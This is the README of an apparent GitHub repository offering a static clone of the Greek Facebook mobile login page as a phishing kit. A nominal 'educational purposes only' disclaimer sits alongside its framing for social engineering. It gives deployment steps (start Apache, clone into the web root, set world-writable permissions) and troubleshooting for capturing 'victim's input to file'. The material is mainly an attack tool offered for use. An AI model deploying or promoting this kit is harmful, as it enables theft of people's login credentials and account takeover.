## About
Facebook Phishing for educational Purposes ONLY.
This is a version of greek Facebook mobile version.
This Phising will come handy for social-engineering techniques.
The reason i created this repo is because facebook is using an algorithm to load all the page resources randomly.
That means everytime you want to use facebook login page, it will only be available for a while because the code is dynamically loaded,  
which also means that every image and css code is loaded dynamically and randomly.
I just collected all the images and the css code and i made them static to the code so it doesn't also require to send any requests to facebook.com.
 
## Usage
1. `sudo service apache2 start`
2. `git clone https://github.com/0xyg3n/fbphish /var/www/html`
3. `sudo chmod 777 /var/www/html/* `


## Troubleshooting

1. Displaying raw php: sudo apt install php
2. Not getting victim's input to file: chmod 777 /var/www/html/*

## Contributing
1. Fork it!
2. Create your feature branch: `git checkout -b my-new-feature`
3. Commit your changes: `git commit -am 'Add some feature'`
4. Push to the branch: `git push origin my-new-feature`
5. Submit a pull request :D


## License

Copyright 2018 0xyg3n

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.